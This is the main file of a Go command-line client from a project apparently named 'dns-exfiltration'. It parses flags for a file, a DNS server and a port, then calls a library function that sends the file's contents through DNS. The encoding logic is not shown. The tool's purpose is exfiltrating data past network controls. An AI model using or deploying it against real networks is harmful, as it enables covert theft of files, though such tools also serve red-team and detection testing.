package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/twiz718/dns-exfiltration/pkg/client"
)

func main() {

	file := flag.String("file", "", "file to send via dns")
	server := flag.String("server", "127.0.0.1", "dns server ip")
	port := flag.String("port", "53", "dns server port")
	debug := flag.Bool("debug", false, "enable debug output")
	flag.Parse()

	if len(*file) == 0 {
		fmt.Println("must provide a file to send")
		os.Exit(1)
	}

	if len(*server) == 0 {
		fmt.Println("must provide a dns server to use")
		os.Exit(1)
	}

	if len(*port) == 0 {
		fmt.Println("must provide a port to use")
		os.Exit(1)
	}

	if *debug {
		fmt.Printf("Sending file %v to %v:%v\n", *file, *server, *port)
	}
	c := client.NewClient(*server, *port, *debug)
	err := c.SendFile(*file)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
